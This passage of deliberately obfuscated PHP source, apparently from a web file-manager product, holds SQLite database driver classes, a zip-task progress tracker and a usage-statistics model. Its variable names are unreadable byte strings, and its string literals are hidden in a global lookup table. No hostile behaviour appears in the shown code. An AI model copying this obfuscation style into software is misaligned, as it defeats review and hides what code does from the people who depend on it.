=& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $‰Ì’Íéç; if ($this->queryID) { $this->free(); } think_action_status($ô¾Ó„ë•[25], 1); think_status($ô¾Ó„ë•[24]); $Î¡˜ıº¨ = sqlite_exec($this->_linkID, $‰Ì’Íéç); $this->debug(); if (!1 === $Î¡˜ıº¨) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹ş¤¶ĞÖ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $êüè©éÛ = sqlite_query($this->_linkID, $_SERVER[¹ş¤¶ĞÖ][27]); if (!$êüè©éÛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $°Ñãáş = sqlite_query($this->_linkID, $_SERVER[¹ş¤¶ĞÖ][28]); if (!$°Ñãáş) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ĞŸ‘­‡ = array(); if ($this->numRows > 0) { for ($ÊÜÖ•Š = 0; $ÊÜÖ•Š < $this->numRows; $ÊÜÖ•Š++) { $ĞŸ‘­‡[$ÊÜÖ•Š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ĞŸ‘­‡; } public function getFields($Ï‘èÚ¦³) { $ï·Õ‹µŞ =& $_SERVER[¹ş¤¶ĞÖ]; $ış¯—Ÿ = $this->query($ï·Õ‹µŞ[29] . $Ï‘èÚ¦³ . $ï·Õ‹µŞ[30]); $€Ùş€íÖ = array(); if ($ış¯—Ÿ) { foreach ($ış¯—Ÿ as $ˆ¡âşÉ­ => $Ó–…Áñ£) { $€Ùş€íÖ[$Ó–…Áñ£[$ï·Õ‹µŞ[31]]] = array($ï·Õ‹µŞ[32] => $Ó–…Áñ£[$ï·Õ‹µŞ[31]], $ï·Õ‹µŞ[33] => $Ó–…Áñ£[$ï·Õ‹µŞ[34]], $ï·Õ‹µŞ[35] => (bool) ($Ó–…Áñ£[$ï·Õ‹µŞ[36]] === $ï·Õ‹µŞ[12]), $ï·Õ‹µŞ[37] => $Ó–…Áñ£[$ï·Õ‹µŞ[38]], $ï·Õ‹µŞ[39] => strtolower($Ó–…Áñ£[$ï·Õ‹µŞ[40]]) == $ï·Õ‹µŞ[41], $ï·Õ‹µŞ[42] => strtolower($Ó–…Áñ£[$ï·Õ‹µŞ[43]]) == $ï·Õ‹µŞ[44]); } } return $€Ùş€íÖ; } public function getTables($‰ù©±Ù = '') { $âÕÌğı =& $_SERVER[¹ş¤¶ĞÖ]; $Êü¹Øšñ = $this->query($âÕÌğı[45] . $âÕÌğı[46] . $âÕÌğı[47]); $÷€ÒØˆ› = array(); foreach ($Êü¹Øšñ as $ˆ½¼ïáç => $ì¶ä÷ºé) { $÷€ÒØˆ›[$ˆ½¼ïáç] = current($ì¶ä÷ºé); } return $÷€ÒØˆ›; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $Í®öÎøş =& $_SERVER[¹ş¤¶ĞÖ]; $óëÚ·˜İ = sqlite_last_error($this->_linkID); $this->error = $óëÚ·˜İ . $Í®öÎøş[4] . sqlite_error_string($óëÚ·˜İ); if ($Í®öÎøş[12] != $this->queryStr) { $this->error .= LNG($Í®öÎøş[48]) . $this->queryStr; } think_trace($this->error, $Í®öÎøş[12], $Í®öÎøş[49]); return $this->error; } public function escapeString($‰÷šìÏª) { return sqlite_escape_string($‰÷šìÏª); } public function parseLimit($ø¸Ó¥¨) { $œÄ…åî« =& $_SERVER[¹ş¤¶ĞÖ]; $Ï´…™íÎ = $œÄ…åî«[12]; if (!empty($ø¸Ó¥¨)) { $ø¸Ó¥¨ = explode($œÄ…åî«[50], $ø¸Ó¥¨); if (count($ø¸Ó¥¨) > 1) { $Ï´…™íÎ .= $œÄ…åî«[51] . $ø¸Ó¥¨[1] . $œÄ…åî«[52] . $ø¸Ó¥¨[0] . $œÄ…åî«[53]; } else { $Ï´…™íÎ .= $œÄ…åî«[51] . $ø¸Ó¥¨[0] . $œÄ…åî«[53]; } } return $Ï´…™íÎ; } } class DbSqlite3Base extends Db { public function __construct($ŒŸáôäì = '') { $ÃêÄ¿æ =& $_SERVER[¹ş¤¶ĞÖ]; if (!class_exists($ÃêÄ¿æ[54])) { think_exception(think_lang($ÃêÄ¿æ[14]) . $ÃêÄ¿æ[55]); } if (!empty($ŒŸáôäì)) { if (!isset($ŒŸáôäì[$ÃêÄ¿æ[16]])) { $ŒŸáôäì[$ÃêÄ¿æ[16]] = 438; } $this->config = $ŒŸáôäì; if (empty($this->config[$ÃêÄ¿æ[17]])) { $this->config[$ÃêÄ¿æ[17]] = array(); } } } public function connect($‘µ¾Û£ = '', $îƒ’õÊ¹ = 0) { $ÀñğÕÔÄ =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->linkID[$îƒ’õÊ¹])) { if (empty($‘µ¾Û£)) { $‘µ¾Û£ = $this->config; } $this->linkID[$îƒ’õÊ¹] = new SQLite3($‘µ¾Û£[$ÀñğÕÔÄ[21]]); if (!$this->linkID[$îƒ’õÊ¹]) { think_exception($this->linkID[$îƒ’õÊ¹]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$îƒ’õÊ¹]->busyTimeout(30000); if (1 != think_config($ÀñğÕÔÄ[22])) { unset($this->config); } } return $this->linkID[$îƒ’õÊ¹]; } public function free() { $this->queryID = null; } public function query($…Õ›†Ğ£) { $ç‰ÖäË‚ =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $…Õ›†Ğ£; if ($this->queryID) { $this->free(); } think_action_status($ç‰ÖäË‚[23], 1); think_status($ç‰ÖäË‚[24]); $this->queryID = $this->_linkID->query($…Õ›†Ğ£); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $•Û»Ä = $this->getAll(); $this->numRows = count($•Û»Ä); return $•Û»Ä; } } public function execute($ßş«Åø) { $Êüì–ú =& $_SERVER[¹ş¤¶ĞÖ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßş«Åø; if ($this->queryID) { $this->free(); } think_action_status($Êüì–ú[25], 1); think_status($Êüì–ú[24]); $·œ…µ•º = $this->_linkID->exec($ßş«Åø); $this->debug(); if (!1 === $·œ…µ•º) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¹ş¤¶ĞÖ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $å¦µı¿¸ = $this->_linkID->query($_SERVER[¹ş¤¶ĞÖ][27]); if (!$å¦µı¿¸) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $¹ïø™€‚ = $this->_linkID->query($_SERVER[¹ş¤¶ĞÖ][28]); if (!$¹ïø™€‚) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¿òö¹Åß = array(); while ($£üäÙóÄ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¿òö¹Åß[] = $£üäÙóÄ; } $this->queryID->reset(); return $¿òö¹Åß; } public function getFields($ÉïÖòó) { $³ëƒ¬ˆí =& $_SERVER[¹ş¤¶ĞÖ]; $’Ñ¨°Š– = $this->query($³ëƒ¬ˆí[29] . $ÉïÖòó . $³ëƒ¬ˆí[30]); $æ¶ÔÃÈÙ = array(); if ($’Ñ¨°Š–) { foreach ($’Ñ¨°Š– as $—·ç˜º¤ => $ üù¤èá) { $æ¶ÔÃÈÙ[$ üù¤èá[$³ëƒ¬ˆí[32]]] = array($³ëƒ¬ˆí[32] => $ üù¤èá[$³ëƒ¬ˆí[32]], $³ëƒ¬ˆí[33] => $ üù¤èá[$³ëƒ¬ˆí[33]], $³ëƒ¬ˆí[35] => (bool) ($ üù¤èá[$³ëƒ¬ˆí[35]] === $³ëƒ¬ˆí[12]), $³ëƒ¬ˆí[37] => $ üù¤èá[$³ëƒ¬ˆí[56]], $³ëƒ¬ˆí[39] => (bool) $ üù¤èá[$³ëƒ¬ˆí[57]], $³ëƒ¬ˆí[42] => (bool) $ üù¤èá[$³ëƒ¬ˆí[57]]); } } return $æ¶ÔÃÈÙ; } public function getTables($Ç…¥®ã = '') { $Õ€Ùû¯‰ =& $_SERVER[¹ş¤¶ĞÖ]; $€õ€Å„× = $this->query($Õ€Ùû¯‰[45] . $Õ€Ùû¯‰[46] . $Õ€Ùû¯‰[47]); $Ú¡°›» = array(); foreach ($€õ€Å„× as $¯ÕÖ©çÚ => $ıÅñ’) { $Ú¡°›»[$¯ÕÖ©çÚ] = current($ıÅñ’); } return $Ú¡°›»; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ê©¼õ‘ğ =& $_SERVER[¹ş¤¶ĞÖ]; $this->error = $this->_linkID->lastErrorMsg(); if ($ê©¼õ‘ğ[12] != $this->queryStr) { $this->error .= LNG($ê©¼õ‘ğ[48]) . $this->queryStr; } think_trace($this->error, $ê©¼õ‘ğ[12], $ê©¼õ‘ğ[49]); return $this->error; } public function escapeString($ë¦áğúú) { $ÕâÌó„» =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->_linkID) { return $this->_linkID->escapeString($ë¦áğúú); } return str_ireplace($ÕâÌó„»[58], $ÕâÌó„»[59], $ë¦áğúú); } public function parseLimit($¬´šºÂé) { $ÍÅ•†’ =& $_SERVER[¹ş¤¶ĞÖ]; $£¥æ™±¬ = $ÍÅ•†’[12]; if (!empty($¬´šºÂé)) { $¬´šºÂé = explode($ÍÅ•†’[50], $¬´šºÂé); if (count($¬´šºÂé) > 1) { $£¥æ™±¬ .= $ÍÅ•†’[51] . $¬´šºÂé[1] . $ÍÅ•†’[52] . $¬´šºÂé[0] . $ÍÅ•†’[53]; } else { $£¥æ™±¬ .= $ÍÅ•†’[51] . $¬´šºÂé[0] . $ÍÅ•†’[53]; } } return $£¥æ™±¬; } } goto D•±–ºÄî; d¼¹Ø ¨‡¿: class TaskZip extends TaskFileTransfer { protected function startAfter() { $èËêÒ€¹ =& $_SERVER[¹ş¤¶ĞÖ]; parent::startAfter(); Hook::bind($èËêÒ€¹[1793], array($this, $èËêÒ€¹[1788])); $‹‚ã‘›› =& $this->task; $‹‚ã‘››[$èËêÒ€¹[1790]] = $èËêÒ€¹[1227]; if (!$‹‚ã‘››[$èËêÒ€¹[1574]]) { $‹‚ã‘››[$èËêÒ€¹[1574]] = LNG($èËêÒ€¹[1794]); } } protected function endAfter() { $Ğ§ä±Ô =& $_SERVER[¹ş¤¶ĞÖ]; parent::endAfter(); Hook::unbind($Ğ§ä±Ô[1793], array($this, $Ğ§ä±Ô[1788])); } public function updateAfter() { $Åƒ‘Ã =& $_SERVER[¹ş¤¶ĞÖ]; $ï°Ã«Ä =& $this->task; if (!$ï°Ã«Ä[$Åƒ‘Ã[812]] || !$ï°Ã«Ä[$Åƒ‘Ã[789]]) { return; } if ($ï°Ã«Ä[$Åƒ‘Ã[1790]] == $Åƒ‘Ã[1227]) { $æÀû¦ıå = $ï°Ã«Ä[$Åƒ‘Ã[1730]]; if ($ï°Ã«Ä[$Åƒ‘Ã[1731]] != $Åƒ‘Ã[1227]) { $æÀû¦ıå = 0; } $ïÚÉıØú = ($ï°Ã«Ä[$Åƒ‘Ã[1734]] + $æÀû¦ıå) / $ï°Ã«Ä[$Åƒ‘Ã[789]]; $ï°Ã«Ä[$Åƒ‘Ã[1678]] = $ïÚÉıØú * 0.3; } else { if ($ï°Ã«Ä[$Åƒ‘Ã[1790]] == $Åƒ‘Ã[342]) { $ïÚÉıØú = $ï°Ã«Ä[$Åƒ‘Ã[1677]] / $ï°Ã«Ä[$Åƒ‘Ã[812]]; $ï°Ã«Ä[$Åƒ‘Ã[1678]] = 0.3 + $ïÚÉıØú * 0.5; } else { if ($ï°Ã«Ä[$Åƒ‘Ã[1790]] == $Åƒ‘Ã[107]) { $ïÚÉıØú = 0; if ($ï°Ã«Ä[$Åƒ‘Ã[1729]]) { $ïÚÉıØú = $ï°Ã«Ä[$Åƒ‘Ã[1730]] / $ï°Ã«Ä[$Åƒ‘Ã[1729]]; } $ï°Ã«Ä[$Åƒ‘Ã[1678]] = 0.3 + 0.5 + $ïÚÉıØú * 0.2; } } } if ($ï°Ã«Ä[$Åƒ‘Ã[1678]] > 0) { $îÕõ–ØÅ = timeFloat() - $ï°Ã«Ä[$Åƒ‘Ã[1680]] - $ï°Ã«Ä[$Åƒ‘Ã[1683]]; $ï°Ã«Ä[$Åƒ‘Ã[1684]] = $îÕõ–ØÅ * (1 - $ï°Ã«Ä[$Åƒ‘Ã[1678]]) / $ï°Ã«Ä[$Åƒ‘Ã[1678]]; } } public function copyFileStart($ï€Í”ôÁ, $ŒÕßª“Ô, $¾‹‘„ğ, $÷¢ˆ—ƒ‘, $Ğû¥å¶, $Ÿì¹¥€) { $”¼Àö¶… =& $_SERVER[¹ş¤¶ĞÖ]; parent::copyFileStart($ï€Í”ôÁ, $ŒÕßª“Ô, $¾‹‘„ğ, $÷¢ˆ—ƒ‘, $Ğû¥å¶, $Ÿì¹¥€); $¿²Šî¯â =& $this->task; if ($¿²Šî¯â[$”¼Àö¶…[1790]] == $”¼Àö¶…[342]) { $¿²Šî¯â[$”¼Àö¶…[1790]] = $”¼Àö¶…[107]; } $this->update(); } public function copyFileEnd($ëÄÕÀÌÛ, $Şş……éê, $¬ÍíÆÃ, $òšÜÓ¢ü, $ƒì¿¹„Ğ, $­¢¤º•ì) { $£¾–âÅ¥ =& $_SERVER[¹ş¤¶ĞÖ]; $Åø‘Æµê =& $this->task; $Åø‘Æµê[$£¾–âÅ¥[1730]] = $Åø‘Æµê[$£¾–âÅ¥[1729]]; $Åø‘Æµê[$£¾–âÅ¥[1734]] += $Åø‘Æµê[$£¾–âÅ¥[1729]]; $Åø‘Æµê[$£¾–âÅ¥[1731]] = $£¾–âÅ¥[12]; $this->update(); } public function nameParse($ƒºˆÆ”è) { $°ùø¶éŠ =& $_SERVER[¹ş¤¶ĞÖ]; $ƒŠ÷İÕÒ =& $this->task; if ($ƒŠ÷İÕÒ[$°ùø¶éŠ[1677]] < $ƒŠ÷İÕÒ[$°ùø¶éŠ[812]]) { $£ùÜ­•Ó = get_path_this($ƒºˆÆ”è); if (strstr($£ùÜ­•Ó, $°ùø¶éŠ[10])) { $ƒŠ÷İÕÒ[$°ùø¶éŠ[1677]] += 1; } } if ($ƒŠ÷İÕÒ[$°ùø¶éŠ[1790]] == $°ùø¶éŠ[1227]) { $ƒŠ÷İÕÒ[$°ùø¶éŠ[1790]] = $°ùø¶éŠ[342]; } $ƒŠ÷İÕÒ[$°ùø¶éŠ[1727]] = $ƒºˆÆ”è; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ùçó°¥­) { $É£Ö¡¦  =& $_SERVER[¹ş¤¶ĞÖ]; $æª¿ÈÒ¦ = array($É£Ö¡¦ [619] => array($É£Ö¡¦ [33] => $É£Ö¡¦ [1795], $É£Ö¡¦ [302] => array($É£Ö¡¦ [224], $É£Ö¡¦ [791], $É£Ö¡¦ [1796], $É£Ö¡¦ [1797])), $É£Ö¡¦ [1798] => array($É£Ö¡¦ [33] => $É£Ö¡¦ [1799], $É£Ö¡¦ [302] => array($É£Ö¡¦ [224], $É£Ö¡¦ [789], $É£Ö¡¦ [1800], $É£Ö¡¦ [1801], $É£Ö¡¦ [1802]))); if (!isset($æª¿ÈÒ¦[$Ùçó°¥­])) { return !1; } $this->optionType = $æª¿ÈÒ¦[$Ùçó°¥­][$É£Ö¡¦ [33]]; $this->field = $æª¿ÈÒ¦[$Ùçó°¥­][$É£Ö¡¦ [302]]; return !0; } public function listData($¿Ïûıâ¡ = false, $Ÿ•·°Ì = "\x6d\x6f\x64\151\x66\171\124\x69\155\x65", $™Å¢­Ûƒ = false) { return parent::listData($¿Ïûıâ¡, $Ÿ•·°Ì, $™Å¢­Ûƒ); } public function trendList($‡Éè¥¥›) { $ñ§ÂìƒÜ =& $_SERVER[¹ş¤¶ĞÖ]; $§µœ¿Òµ = $this->listData(); if ($§µœ¿Òµ) { $ì§¶ÅŒÚ = end($§µœ¿Òµ); $×„ÌŞª = date($ñ§ÂìƒÜ[1803], strtotime($ñ§ÂìƒÜ[1804])); if ($ì§¶ÅŒÚ[$ñ§ÂìƒÜ[224]] == $×„ÌŞª) { return $§µœ¿Òµ; } $ş¼Õ´à = strtotime($ì§¶ÅŒÚ[$ñ§ÂìƒÜ[224]]); } if (!isset($ş¼Õ´à)) { $œ¿©·Ó© = $‡Éè¥¥› == $ñ§ÂìƒÜ[619] ? $ñ§ÂìƒÜ[554] : $ñ§ÂìƒÜ[851]; $ş¼Õ´à = Model($œ¿©·Ó©)->min($ñ§ÂìƒÜ[201]); } $Íü¯ÑÚ = $ñ§ÂìƒÜ[1805] . ucfirst($‡Éè¥¥›); $ª‘Ô›çè = $this->dateList($ş¼Õ´à); foreach ($ª‘Ô›çè as $×„ÌŞª) { $this->{$Íü¯ÑÚ}($×„ÌŞª); } return $this->listData(); } private function dateList($¿îú•²‰) { $ıŠïªÇ =& $_SERVER[¹ş¤¶ĞÖ]; $»Ê„„ò = $¿îú•²‰; $î²Äá°Ø = strtotime($ıŠïªÇ[1804]); $Ù¸Äîö = array(); while ($»Ê„„ò <= $î²Äá°Ø) { $Ù¸Äîö[] = date($ıŠïªÇ[1803], $»Ê„„ò); $»Ê„„ò = strtotime($ıŠïªÇ[1806], $»Ê„„ò); } return $Ù¸Äîö; } public function _recordUser($ÉÜšÀ¸ = '') { $ïƒ™¤™¯ =& $_SERVER[¹ş¤¶ĞÖ]; $Ğ¨Ø¦¹É = strtotime(date($ïƒ™¤™¯[1807], strtotime($ÉÜšÀ¸))); $¯‹Û¸ = strtotime(date($ïƒ™¤™¯[1808], strtotime($ÉÜšÀ¸))); $üõÚÉ—î = array($ïƒ™¤™¯[201] => array($ïƒ™¤™¯[1046], $¯‹Û¸)); $ÂœÀğ™ = Model($ïƒ™¤™¯[554])->where($üõÚÉ—î)->count($ïƒ™¤™¯[1676]); $üõÚÉ—î[$ïƒ™¤™¯[201]] = array($ïƒ™¤™¯[362], array($Ğ¨Ø¦¹É, $¯‹Û¸)); $¯³Â¢†ë = Model($ïƒ™¤™¯[554])->where($üõÚÉ—î)->count($ïƒ™¤™¯[1676]); $üõÚÉ—î[$ïƒ™¤™¯[33]] = $ïƒ™¤™¯[1809]; $¯¯âå¿­ = Model($ïƒ™¤™¯[1810])->where($üõÚÉ—î)->count($ïƒ™¤™¯[1811]); $èüÏ‡“§ = array($ïƒ™¤™¯[224] => $ÉÜšÀ¸, $ïƒ™¤™¯[791] => (int) $ÂœÀğ™, $ïƒ™¤™¯[1796] => (int) $¯³Â¢†ë, $ïƒ™¤™¯[1797] => (int) $¯¯âå¿­); return $this->insert($èüÏ‡“§); } public function _recordStore($ÇœùàıÃ = '') { $Ùˆéú¡Ü =& $_SERVER[¹ş¤¶ĞÖ]; $‹ğ¯‚†¶ = strtotime(date($Ùˆéú¡Ü[1808], strtotime($ÇœùàıÃ))); $Í°Ïñ¿é = array($Ùˆéú¡Ü[201] => array($Ùˆéú¡Ü[1046], $‹ğ¯‚†¶)); $ö£ü¤Ûø = Model($Ùˆéú¡Ü[500])->where($Í°Ïñ¿é)->sum($Ùˆéú¡Ü[76]); $Í°Ïñ¿é[$Ùˆéú¡Ü[439]] = 0; $œü—ÃŞš = Model($Ùˆéú¡Ü[851])->where($Í°Ïñ¿é)->sum($Ùˆéú¡Ü[76]); $Í°Ïñ¿é[$Ùˆéú¡Ü[440]] = 1; $Û°¨³ôÁ = Model($Ùˆéú¡Ü[851])->where($Í°Ïñ¿é)->sum($Ùˆéú¡Ü[76]); $Í°Ïñ¿é[$Ùˆéú¡Ü[440]] = 2; $¼ùÔ¹°ˆ = Model($Ùˆéú¡Ü[851])->where($Í°Ïñ¿é)->sum($Ùˆéú¡Ü[76]); $×ÄÚ ÜÙ = array($Ùˆéú¡Ü[224] => $ÇœùàıÃ, $Ùˆéú¡Ü[789] => (int) $œü—ÃŞš, $Ùˆéú¡Ü[1800] => (int) $ö£ü¤Ûø, $Ùˆéú¡Ü[1801] => (int) $Û°¨³ôÁ, $Ùˆéú¡Ü[1802] => (int) $¼ùÔ¹°ˆ); return $this->insert($×ÄÚ ÜÙ); } public function trend($îüÏ´ƒ¾, $¹ºàîşÆ) { $¹ÂùÜñ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$this->init($îüÏ´ƒ¾)) { return !1; } $›Ò·è¶ = $this->trendList($îüÏ´ƒ¾); if ($›Ò·è¶ && $¹ºàîşÆ != $¹ÂùÜñ[1649]) { $ÄŒ×•ü = $›Ò·è¶[0][$¹ÂùÜñ[224]]; $ÜóÀ÷é = $this->validDate($¹ºàîşÆ, $ÄŒ×•ü); $å” ÍÄ† = array(); $Ñøô² = array_to_keyvalue($›Ò·è¶, $¹ÂùÜñ[224]); foreach ($ÜóÀ÷é as $Ïëæ©ûä) { if (isset($Ñøô²[$Ïëæ©ûä])) { $¼›´¼êŸ = $Ñøô²[$Ïëæ©ûä]; } else { $¼›´¼êŸ = end($›Ò·è¶); $¼›´¼êŸ[$¹ÂùÜñ[224]] = $Ïëæ©ûä; if ($îüÏ´ƒ¾ == $¹ÂùÜñ[619]) { $¼›´¼êŸ[$¹ÂùÜñ[1796]] = $¼›´¼êŸ[$¹ÂùÜñ[1797]] = 0; } } $å” ÍÄ†[] = $¼›´¼êŸ; } $›Ò·è¶ = $å” ÍÄ†; } $ËËö÷® = array($¹ÂùÜñ[619] => array($¹ÂùÜñ[791] => LNG($¹ÂùÜñ[1812]), $¹ÂùÜñ[1796] => LNG($¹ÂùÜñ[1813]), $¹ÂùÜñ[1797] => LNG($¹ÂùÜñ[1814])), $¹ÂùÜñ[1798] => array($¹ÂùÜñ[789] => LNG($¹ÂùÜñ[1815]), $¹ÂùÜñ[1800] => LNG($¹ÂùÜñ[1816]), $¹ÂùÜñ[1801] => LNG($¹ÂùÜñ[1817]), $¹ÂùÜñ[1802] => LNG($¹ÂùÜñ[1818]))); $ÍÙÏí = array($¹ÂùÜñ[619] => $¹ÂùÜñ[1819], $¹ÂùÜñ[1798] => $¹ÂùÜñ[76]); if (empty($›Ò·è¶)) { $Ïëæ©ûä = date($¹ÂùÜñ[1803], strtotime($¹ÂùÜñ[1804])); $óÙÑ²Ğ¬ = array($¹ÂùÜñ[224] => $Ïëæ©ûä); foreach ($ËËö÷®[$îüÏ´ƒ¾] as $É‚äéİ => $Ïé¨ìÜ) { $óÙÑ²Ğ¬[$É‚äéİ] = 0; } $›Ò·è¶[] = $óÙÑ²Ğ¬; } $ÕáèâÌ = array(); foreach ($›Ò·è¶ as $Ïé¨ìÜ) { if ($îüÏ´ƒ¾ == $¹ÂùÜñ[1798] && $Ïé¨ìÜ[$¹ÂùÜñ[1800]] > $Ïé¨ìÜ[$¹ÂùÜñ[789]]) { $Ïé¨ìÜ[$¹ÂùÜñ[1800]] = $Ïé¨ìÜ[$¹ÂùÜñ[789]]; } foreach ($ËËö÷®[$îüÏ´ƒ¾] as $É‚äéİ => $÷áÆµ®¤) { $¼›´¼êŸ = array($¹ÂùÜñ[224] => $Ïé¨ìÜ[$¹ÂùÜñ[224]], $¹ÂùÜñ[1574] => $÷áÆµ®¤); $¼›´¼êŸ[$ÍÙÏí[$îüÏ´ƒ¾]] = isset($Ïé¨ìÜ[$É‚äéİ]) ? $Ïé¨ìÜ[$É‚äéİ] : 0; $ÕáèâÌ[] = $¼›´¼êŸ; } } return $ÕáèâÌ; } public function validDate($ëÁÚ¡°Å, $¹ñá¸¿) { $ã¿Ù•ìˆ =& $_SERVER[¹ş¤¶ĞÖ]; $É¯£ëöŞ = date($ã¿Ù•ìˆ[1803], strtotime($ã¿Ù•ìˆ[1804])); $˜˜Îë—ä = array($É¯£ëöŞ); switch ($ëÁÚ¡°Å) { case $ã¿Ù•ìˆ[1656]: $–éÎã‚… = mktime(0, 0, 0, date($ã¿Ù•ìˆ[1820]), date($ã¿Ù•ìˆ[1394]) - date($ã¿Ù•ìˆ[1457]) + 7 - 7, date($ã¿Ù•ìˆ[1821])); $â¤æ›ê = 0; do { $¨À“÷Ÿ = date($ã¿Ù•ìˆ[1803], $–éÎã‚… - 3600 * 24 * 7 * $â¤æ›ê); $˜˜Îë—ä[] = $¨À“÷Ÿ; $â¤æ›ê++; } while ($¹ñá¸¿ < $¨À“÷Ÿ); break; case $ã¿Ù•ìˆ[1654]: $â¤æ›ê = 1; do { $Œã¶©É = date($ã¿Ù•ìˆ[1822], strtotime("\55\x20{$â¤æ›ê}\x20\155\157\156\164\x68\163")); $˜˜Îë—ä[] = $Œã¶©É; $â¤æ›ê++; } while ($¹ñá¸¿ < $Œã¶©É); break; case $ã¿Ù•ìˆ[1823]: $–àÛ¢ï = (int) date($ã¿Ù•ìˆ[1821], strtotime($¹ñá¸¿)); $Â“Ö¼¹ = (int) date($ã¿Ù•ìˆ[1821]); if ($–àÛ¢ï >= $Â“Ö¼¹) { break; } for ($–àÛ¢ï; $–àÛ¢ï < $Â“Ö¼¹; $–àÛ¢ï++) { $˜˜Îë—ä[] = $–àÛ¢ï . $ã¿Ù•ìˆ[1824]; } break; default: break; } if ($¹ñá¸¿ > end($˜˜Îë—ä)) { array_pop($˜˜Îë—ä); } sort($˜˜Îë—ä); return $˜˜Îë—ä; } public function listTable($—Úâ×´°) { $˜Œ¶ã = ucfirst($—Úâ×´°); return Model($˜Œ¶ã)->listData(); } public function option($¹ ·Üã¨) { $ÌûÖäşÈ = $_SERVER[¹ş¤¶ĞÖ][1825] . ucfirst($¹ ·Üã¨); return $this->{$ÌûÖäşÈ}(); } private function optionUser() { $Ì±Ï‚ ı =& $_SERVER[¹ş¤¶ĞÖ]; $¡æ·Ê´² = Model($Ì±Ï‚ ı[554])->count($Ì±Ï‚ ı[1676]); $ôáá°Á¥ = Model($Ì±Ï‚ ı[554])->where($Ì±Ï‚ ı[1826])->count($Ì±Ï‚ ı[1676]); $ÈäµåÉâ = intval($GLOBALS[$Ì±Ï‚ ı[6]][$Ì±Ï‚ ı[378]][$Ì±Ï‚ ı[1629]]) / 3600; $ªˆ¥° = strtotime("\x2d{$ÈäµåÉâ}\x20\x68\157\x75\162\x73"); $¯Ìò…Ö® = strtotime(date($Ì±Ï‚ ı[1807])); if ($ªˆ¥° < $¯Ìò…Ö®) { $ªˆ¥° = $¯Ìò…Ö®; } $‡ì¦‰œæ = array($Ì±Ï‚ ı[1827] => array($Ì±Ï‚ ı[1047], $ªˆ¥°)); $ı¹ÄßØ¬ = (int) Model($Ì±Ï‚ ı[554])->where($‡ì¦‰œæ)->count($Ì±Ï‚ ı[1676]); if (!$ı¹ÄßØ¬) { $ı¹ÄßØ¬ = 1; } $‡ì¦‰œæ = array($Ì±Ï‚ ı[1827] => array($Ì±Ï‚ ı[1047], $¯Ìò…Ö®)); $¾ï¤ïöğ = Model($Ì±Ï‚ ı[554])->where($‡ì¦‰œæ)->count($Ì±Ï‚ ı[1676]); return array($Ì±Ï‚ ı[784] => (int) $¡æ·Ê´², $Ì±Ï‚ ı[1828] => (int) ($¡æ·Ê´² - $ôáá°Á¥), $Ì±Ï‚ ı[1829] => (int) $ôáá°Á¥, $Ì±Ï‚ ı[1830] => (int) $¾ï¤ïöğ, $Ì±Ï‚ ı[1831] => $ı¹ÄßØ¬); } private function optionFile() { $ÀéË†ßï =& $_SERVER[¹ş¤¶ĞÖ]; $É¯ğé˜Ğ = $this->sourceSize(); $°¯‡“¸È = $É¯ğé˜Ğ[$ÀéË†ßï[76]]; $ıÇ‘åæ = $É¯ğé˜Ğ[$ÀéË†ßï[1800]]; $ÚŸÅ‘ë­ = Model($ÀéË†ßï[851])->where(array($ÀéË†ßï[439] => 0))->count($ÀéË†ßï[431]); $ğµ°¾Ò¬ = array($ÀéË†ßï[439] => 0, $ÀéË†ßï[201] => array($ÀéË†ßï[1047], strtotime(date($ÀéË†ßï[1807])))); $€Ÿˆ ® = Model($ÀéË†ßï[851])->where($ğµ°¾Ò¬)->sum($ÀéË†ßï[76]); $Ë‰×ø˜ = Model($ÀéË†ßï[851])->where($ğµ°¾Ò¬)->count($ÀéË†ßï[431]); return array($ÀéË†ßï[789] => $°¯‡“¸È, $ÀéË†ßï[1800] => $ıÇ‘åæ, $ÀéË†ßï[1832] => $°¯‡“¸È - $ıÇ‘åæ, $ÀéË†ßï[1833] => (int) $€Ÿˆ ®, $ÀéË†ßï[791] => (int) $ÚŸÅ‘ë­, $ÀéË†ßï[1834] => (int) $Ë‰×ø˜); } private function optionAccess() { $Ï¦è€¸Ÿ =& $_SERVER[¹ş¤¶ĞÖ]; return array($Ï¦è€¸Ÿ[784] => $this->typeLogCnt(), $Ï¦è€¸Ÿ[107] => $this->typeLogCnt($Ï¦è€¸Ÿ[107]), $Ï¦è€¸Ÿ[481] => $this->typeLogCnt($Ï¦è€¸Ÿ[481]), $Ï¦è€¸Ÿ[1835] => $this->typeLogCnt($Ï¦è€¸Ÿ[1835]), $Ï¦è€¸Ÿ[1836] => $this->typeLogCnt($Ï¦è€¸Ÿ[1836]), $Ï¦è€¸Ÿ[619] => 